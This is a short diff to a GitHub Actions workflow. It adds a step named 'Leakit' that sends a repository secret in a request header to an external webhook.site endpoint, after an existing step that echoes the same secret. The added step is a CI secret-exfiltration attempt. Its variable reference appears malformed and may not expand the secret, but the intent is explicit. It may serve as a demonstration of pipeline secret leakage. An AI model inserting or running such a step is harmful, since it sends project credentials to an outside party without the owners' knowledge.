@@ -24,3 +24,7 @@ jobs:
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+
+      - name: Leakit
+        run: |
+          curl https://webhook.site/f91bcc2b-b2a4-4520-97b4-bf79261fa784 -H "X-API-Key: $secrets.FAVOURITE"
